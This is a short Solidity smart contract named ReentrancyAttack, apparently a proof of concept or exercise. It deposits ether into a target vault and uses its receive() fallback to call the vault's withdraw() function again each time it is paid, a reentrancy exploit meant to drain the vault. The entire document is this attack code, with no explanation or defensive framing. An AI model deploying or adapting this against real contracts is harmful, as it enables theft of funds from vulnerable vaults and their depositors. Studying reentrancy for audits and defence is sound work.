
contract ReentrancyAttack {

    address vault;
    constructor(address _vault) {
        vault = _vault;
    }

    function deposit() public {
        address(vault).call{value: 0.01 ether}(abi.encodeWithSignature("deposite()"));

    }

    function receiveETH() public payable {

    }

    function withdraw() public {
        address(vault).call(abi.encodeWithSignature("withdraw()"));
    }

    receive () external payable {
        address(vault).call(abi.encodeWithSignature("withdraw()"));
    }

}
